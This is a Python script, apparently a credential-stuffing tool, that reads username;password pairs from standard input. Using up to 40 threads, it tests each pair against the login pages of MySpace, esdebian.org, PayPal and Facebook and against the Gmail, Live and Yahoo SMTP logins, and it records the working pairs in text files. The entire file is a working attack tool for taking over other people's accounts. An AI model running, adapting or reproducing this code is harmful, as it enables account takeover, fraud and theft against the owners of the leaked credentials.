#!/usr/bin/env python
#-*- coding: UTF-8 -*-

from browser import BROWSER
from debug import debug
from decoradores import Retry, Async, Verbose
from functools import wraps
import debug as Debug
import os
import re
import smtplib
import socket
import sys
import time

RC = "%s/.fisgon/" % os.getenv("HOME")
VERBOSE = 0


class Discovers(list):
    def __call__(self, func):
        self.append(func)
        return func

discovers = Discovers()

def write(text, destination):
    f = open(destination, "a")
    f.write("%s\n" % text)
    f.close()


def read(filename):
    try:
        pairs = [tuple(line.strip().split(";"))
            for line in open(filename).readlines()]
    except IOError:
        pairs = []

    return pairs




def cache(func):
    truesname = func.func_name + ".txt"
    falsesname = "no-" + func.func_name + ".txt"
    nonesname = "none-" + func.func_name + ".txt"

    trues = set(read(truesname))
    falses = set(read(falsesname))

    @wraps(func)
    def dfunc(*args, **kwargs):
        if args in trues:
            return True
        elif args in falses:
            return False
        else:
            result = func(*args, **kwargs)
            line = ";".join(args)
            if result:
                write(line, truesname)
            elif result is not None:
                write(line, falsesname)
            else:
                write(line, nonesname)

    return dfunc



def ismail(user):
    if re.search(
        r"(^[-!#$%&'*+/=?^_`{}|~0-9A-Z]+(\.[-!#$%&'*+/=?^_`{}|~0-9A-Z]+)*"
        r'|^"([\001-\010\013\014\016-\037!#-\[\]-\177]'
        r'|\\[\001-011\013\014\016-\177])*"'
        r')@(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,6}\.?$',
        user, re.IGNORECASE):
        return True
    else:
        return False

@discovers
def myspace(user, password):
    if ismail(user):
        b.clear_cookies()
        form = b.get_forms("http://myspace.com", cache=1000)[1]
        form["""ctl00$ctl00$cpMain$cpMain$LoginBox$Email_Textbox"""] = user
        form["""ctl00$ctl00$cpMain$cpMain$LoginBox$Password_Textbox"""] = password
        try:
            code, title = form.submit()
            if code == 200:
                if """?fuseaction=signout""" in b.get_html():
                    return "myspace.com"
                else:
                    return False
            else:
                return None
        except BrowserStateError:
            return None
    else:
        return False

@discovers
def esdebian(user, password):
    if ismail(user):
        b.clear_cookies()
        form = b.get_forms("http://www.esdebian.org", cache=1000)[1]
        form["name"] = user
        form["pass"] = password
        try:
            code, title = form.submit()
            if code == 200:
                if """<a href="/logout">Salir</a>""" in b.get_html():
                    return "esdebian.org"
                else:
                    return False
            else:
                return None
        except BrowserStateError:
            return None
    else:
        return False

@discovers
def paypal(user, password):
    if ismail(user):
        b.clear_cookies()
        form = b.get_forms("https://www.paypal.com/ar/cgi-bin/webscr"
            "?cmd=_login-run", cache=0*1000)[1]
        form["login_email"] = user
        form["login_password"] = password
        try:
            code, title = form.submit()
            if code == 200:
                if ('cgi-bin/webscr?cmd=_login-done' in b.get_html()):
                    return "paypal.com"
                elif ('cgi-bin/webscr?cmd=_logout' in b.get_html(
                    "https://www.paypal.com/ar/cgi-bin/webscr?"
                    "cmd=_account&nav=0")):
                    return "paypal.com"
                else:
                    return False
            else:
                return None
        except BrowserStateError:
            return None
    else:
        return False


@discovers
def facebook(user, password):
    if ismail(user):
        b.clear_cookies()
        form = b.get_forms("http://facebook.com", cache=1000)[0]
        form["email"] = user
        form["pass"] = password
        try:
            code, title = form.submit()
            if code == 200:
                if """facebook.com/logout.php?""" in b.get_html():
                    return "facebook.com"
                else:
                    return False
            else:
                return None
        except BrowserStateError:
            return None
    else:
        return False


@discovers
@Async
@Verbose(VERBOSE)
@cache
def gmail(user, password):
    if ismail(user):
        smtp = smtplib.SMTP()
        try:
            smtp.connect("smtp.gmail.com", 587)
            smtp.ehlo()
            smtp.starttls()
            smtp.debuglevel = 0
            try:
                smtp.login(user, password)
            except smtplib.SMTPAuthenticationError:
                return False
            except socket.sslerror:
                return False
        except socket.gaierror or smtplib.SMTPServerDisconnected:
            debug("E: Server disconnected")
            return None
    else:
        return False
    debug("gmail: %s, %s" % (user, password))
    return "gmail.com"


@discovers
@Async
@Verbose(VERBOSE)
@cache
def live(user, password):
    if ismail(user):
        smtp = smtplib.SMTP()
        try:
            smtp.connect("smtp.live.com", 587)
            smtp.ehlo()
            smtp.starttls()
            smtp.debuglevel = 0
            try:
                smtp.login(user, password)
            except smtplib.SMTPAuthenticationError:
                return False
            except socket.sslerror:
                return False
        except socket.gaierror:
            debug("E: socket.gaierror")
            return None
    else:
        return False
    debug("live: %s, %s" % (user, password))
    return "live.com"


@discovers
@Async
@Verbose(VERBOSE)
@cache
def yahoo(user, password):
    if ismail(user) and "@yahoo." in user:
        smtp = smtplib.SMTP()
        try:
            smtp.connect("smtp.mail.yahoo.com", 587)
            smtp.debuglevel = 0
            smtp.ehlo()
            try:
                smtp.login(user, password)
            except smtplib.SMTPAuthenticationError:
                return False
        except socket.gaierror:
            debug("E: socket.gaierror")
            return None
    else:
        return False
    debug("yahoo: %s, %s" % (user, password))
    return "yahoo.com"


def main():
    debug("FUN TIME!")
    entrada = sys.stdin.readlines()

    threads = 40
    pause = .1
    slots = [None] * threads
    for line in entrada:
        user, password = line.strip().split(";")[:2]
        user = user.lower()

        for discover in discovers:
            if isinstance(discover, Async):
                passed = False
                tries = 0
                while not passed:
                    tries += 1
                    for pos in xrange(threads):
                        if slots[pos] is None or not slots[pos].is_alive():
                            slots[pos] = discover(user, password)
                            passed = True
                            break
                    time.sleep(pause)
                pause *= tries ** 0.2 * .9
                if tries > 10:
                    pause = pause * 10 + 0.001

    for slot in slots:
        if slot is not None:
            slot.get_result()

    debug(">>> EOF !!")

if __name__ == "__main__":
    b = BROWSER()
    exit(main())
